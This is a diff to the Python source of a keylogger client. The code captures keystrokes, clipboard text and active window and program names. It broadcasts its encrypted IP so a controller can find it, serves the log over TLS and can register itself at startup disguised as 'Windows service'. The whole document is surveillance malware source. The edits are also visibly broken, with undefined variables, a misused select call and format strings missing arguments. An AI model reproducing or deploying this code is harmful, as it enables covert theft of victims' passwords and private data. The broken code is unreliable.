@@ -17,16 +17,18 @@ import ssl
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from string import printable
+from select import select
+from html import escape
 
-
+#yo
 def broadcast_myself():
     """
     Repeatedly broadcasts the client so the controller will find it. All encrypted.
     """
-    global BD_PORT, BD_INTERVAL, conn, cipher_rsa
+    global BD_PORT, BD_INTERVAL, conn, conn, cipher_rsa
     BDs = socket(AF_INET, SOCK_DGRAM)
     while True:
-        if not connected:
+        if not conn:
             BDs.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
             localIP = gethostbyname(gethostname())
             BDs.sendto(cipher_rsa.encrypt(localIP), ("<broadcast>", BD_PORT))
@@ -38,33 +40,28 @@ def listen():
     """
     Listens for incoming connection by the serber and sends him the keylog when requested. All encrypted.
     """
-    global FILE_NAME, connected, file_handle, file_lock, text_buffer
-    listener = socket(AF_INET, SOCK_STREAM)
+    global FILE_NAME, file_handle, file_lock, text_buffer, conn
+    server = socket(AF_INET, SOCK_STREAM)
     set_keepalive(listener)
-    listener.bind(("", HOST_PORT))
-    listener.listen(1)
-    while True:
-        conn, _ = listener.accept()
-        connected = True
-        conn = ssl.wrap_socket(
-            sock=conn, ca_certs="cert.pem", cert_reqs=ssl.CERT_REQUIRED)
-        conn = Message_socket(_sock=conn)
-        while True:
-            try:
-                if conn.recv_msg() != "send file":
-                    continue
-                with file_lock:
-                    file_handle.seek(0)
-                    data = file_handle.read()
-                    conn.send_msg(data)
-                    file_handle.close()
-                    file_handle = open(FILE_NAME, "w+")
-                write_to_file()
-            except (timeout, error):
-                conn.close()
-                connected = False
-                break
-    listener.close()
+    server.bind(("", HOST_PORT))
+    server.listen(1)
+    while server:
+        readable, writable, exceptional = select.select(
+            [server], [], [conn])
+        for s in readable:
+            if s is server:
+                possible_conn, _ = s.accept()
+                try:
+                    possible_conn = ssl.wrap_socket(
+                        sock=possible_conn, ca_certs="cert.pem", cert_reqs=ssl.CERT_REQUIRED)
+                except:
+                    pass
+                else:
+                    conn = Message_socket(_sock=possible_conn)
+                    conn.send_json({})
+        for s in exceptionals:
+            s.close()
+            s = None
 
 
 def header(text):
@@ -77,8 +74,8 @@ def header(text):
     Returns:
         formatted text
     """
-    return "\n{0}\n{1}{2}{1}\n{0}\n".format("=" * (len(text) + 20),
-                                            " " * (((len(text) + 20) / 2) - (len(text) / 2)), text)
+    text_width = reduce(lambda x, y: max(x, len(y)), text.split())
+    return "\n{0}\n{1}\n{0}\n".format("=" * (text_width + 2), text)
 
 
 def write_to_file():
@@ -88,7 +85,8 @@ def write_to_file():
     Returns:
         True if succeeded writing False otherwise
     """
-    global text_buffer, file_handle, file_lock
+    global text_buffer, file_handle, file_lock, conn
+    conn.send_json({"data": text_buffer})
     if file_lock.acquire(False):
         file_handle.write(text_buffer)
         file_lock.release()
@@ -112,9 +110,7 @@ def clipboard_listener():
             curr_clip = last_clip
         win32clipboard.CloseClipboard()
         if curr_clip != last_clip:
-            text_buffer += header("START CLIPBOARD")
-            text_buffer += curr_clip
-            text_buffer += header("END CLIPBOARD")
+            text_buffer += "<clipboard>{}</clipboard>".format(escape(curr_clip))
             last_clip = curr_clip
             write_to_file()
         sleep(CLIP_POLL_RATE)
@@ -127,18 +123,29 @@ def on_key_down(event):
     Args:
         event: keyboard ebent
     """
-    global last_win, file_lock, text_buffer, BANNED_BUTTONS, BANNED_UNICODES, DEBUG
+    global last_win, file_lock, text_buffer, BANNED_BUTTONS, BANNED_UNICODES, DEBUG, last_exe
     modifiers = get_modifiers()
-    curr_win = GetWindowTextW(win32gui.GetForegroundWindow())
+    curr_win_handle = win32gui.GetForegroundWindow()
+    curr_win = GetWindowTextW(curr_win_handle)
+    curr_exe = get_window_executable(curr_win_handle)
     un_char = ToUnicode(event.KeyID)
     if DEBUG:
-        print "Modifiers", modifiers
-        print "Unicode:", un_char
-        print "Virtual Key:", event.KeyID
-        print "Ascii:", event.Ascii, chr(event.Ascii)
-        print "Description:", event.Key
+        print("Modifiers", modifiers)
+        print("Unicode:", un_char)
+        print("Virtual Key:", event.KeyID)
+        print("Ascii:", event.Ascii, chr(event.Ascii))
+        print("Description:", event.Key)
+
+    if curr_exe != last_exe:
+        if last_exe:
+            text_buffer += "</title></exe>"
+        text_buffer += "<exe exe={curr_exe} name={} icon={}>".format(get_exe_description(curr_exe))
+        last_win = ""
+        last_exe = curr_exe
     if curr_win != last_win:
-        text_buffer += header(curr_win)
+        if last_win:
+            text_buffer += "</title>"
+        text_buffer += "<title titleName={curr_win}>".format()
         last_win = curr_win
     if un_char["code"] == 1 and chr(event.Ascii) in printable[:-5] and not modifiers["ctrl"]:
         text_buffer += un_char["char"]
@@ -155,16 +162,16 @@ if __name__ == "__main__":
     CLIP_POLL_RATE = 5
     FILE_NAME = NamedTemporaryFile(delete=False).name
     if DEBUG:
-        print FILE_NAME
+        print(FILE_NAME)
     STARTUP = False
     STARTUP_NAME = "Windows service"
     CERT_FILE = "cert.pem"
     BANNED_BUTTONS = ["Apps", "Lshift", "Rshift", "Lmenu",
                       "Rmenu", "Lcontrol", "Rcontrol", "Capital"]
-
-    connected = False
+    conn = None
     text_buffer = ""
     last_win = ""
+    last_exe = ""
 
     if STARTUP:
         register_startup(STARTUP_NAME, realpath(argv[0]))
@@ -173,8 +180,8 @@ if __name__ == "__main__":
     cipher_rsa = PKCS1_OAEP.new(public_key)
     file_lock = Lock()
     file_handle = open(FILE_NAME, "w+")
-    file_handle.write(header("KEYLOG STARTED AT {time} BY USER {user} ON {computer}".format(
-        time=datetime.now().strftime("%d.%m.%Y %H:%M:%S"), user=getuser(), computer=environ['COMPUTERNAME'])))
+    file_handle.write(header("KEYLOG STARTED AT {time:%d.%m.%Y %H:%M:%S} BY USER {user} ON {computer}".format(
+        user=getuser(), computer=environ['COMPUTERNAME'])))
 
     Thread(target=broadcast_myself).start()
     Thread(target=listen).start()
